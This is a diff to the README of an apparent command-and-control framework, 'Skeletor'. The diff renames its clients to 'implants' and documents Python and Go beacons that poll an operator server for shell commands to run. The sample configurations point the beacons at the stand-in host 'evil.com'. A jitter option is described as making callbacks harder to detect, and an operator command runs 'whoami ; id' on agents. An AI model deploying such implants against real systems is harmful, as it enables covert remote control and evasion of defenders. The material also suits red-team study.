@@ -53,27 +53,29 @@ with the last argument being a list of comma seperated agent IDs of the agents y
 ```
 skelctl cmd "whoami ; id"
 ``` 
-## Client
-To use the client, make any configuration changes needed in the main function and run the python file, and it will begin beaconing out. There are currently clients written in two different languages: Python and Go.
+## Implants
+To set up the implants, make any configuration changes needed in the main function of the implant program. Then, when run it will begin beaconing out to retrieve commands from the configured server. There are currently implants written in two different languages: Python and Go.
 
-### Python Client
- The Python client has three configurable arguments when creating an instance of the Client class: server_ip (mandatory, the IP or FQDN of the host the server is running on), port (port the server is listening on, defaults to 80), and callback_interval (the interval, in seconds, of how often the client should beacon out. Default is 120). The following codeblock illustrates what the main function of client.py looks like when specifying all arguments to the client.
+### Python Implant
+ The Python implant has three configurable arguments when creating an instance of the Beacon class: server_ip (mandatory, the IP or FQDN of the host the server is running on), port (port the server is listening on, defaults to 80), and callback_interval (the interval, in seconds, of how often the implant should beacon out. Default is 120). Additional arguments which can be defined are the jitter (defines the amount of seconds, + or -, the callback interval should be randomly adjusted each sleep to make callbacks harder to detect) and the debug and https booleans (both default to False, if https is True then https protocol will be used instead of http, and if debug is True then debugging + error messages will be printed to stdout). The following codeblock illustrates what the main function of beacon.py looks like when specifying all arguments to the implant.
 ```python
 def main():
-    client = Client(server_ip="thisisac2.xyz", port=80,callback_interval=120)
-    client.run()
+    beacon = Beacon(server_ip="evil.com", port=80,callback_interval=120,jitter=5,debug=False,https=False)
+    beacon.run()
 ```
 
-### Go Client
+### Go Implant
 
- The Go client's configurable arguments must be changed in the agent variable definition at the beginning of the main function. ServerIP, ServerPort and CallbackInterval can all be changed depending on your desired configuration, while the LocalIP and Client fields of the agent struct SHOULD NOT be modified.
+ The Go implant's configurable arguments must be changed in the agent variable definition at the beginning of the main function. ServerIP, ServerPort, CallbackInterval, Jitter and Debug can all be changed depending on your desired configuration, while the LocalIP and Client fields of the agent struct SHOULD NOT be modified. ServerIP and ServerPort define the IP/FQDN and port the Skeletor server is listening for incoming connections on, while the CallbackInterval defines how often the implant should beacon out, while Jitter defines the amount of seconds, + or -, the callback interval should be randomly adjusted each sleep to make callbacks harder to detect. Debug is a boolean value which, when set to true, will print out debugging and error messages to stdout.
 
 ```go
 agent := Agent{
         LocalIP:  getLocalIP(),
-        ServerIP: "127.0.0.1",
+        ServerIP: "evil.com",
         ServerPort: 80,
-		CallbackInterval: 60 * time.Second,
+		CallbackInterval: 15,
+		Jitter: 5,
+		Debug: true,
 		Client: &http.Client{
             Timeout: 10 * time.Second,
         },
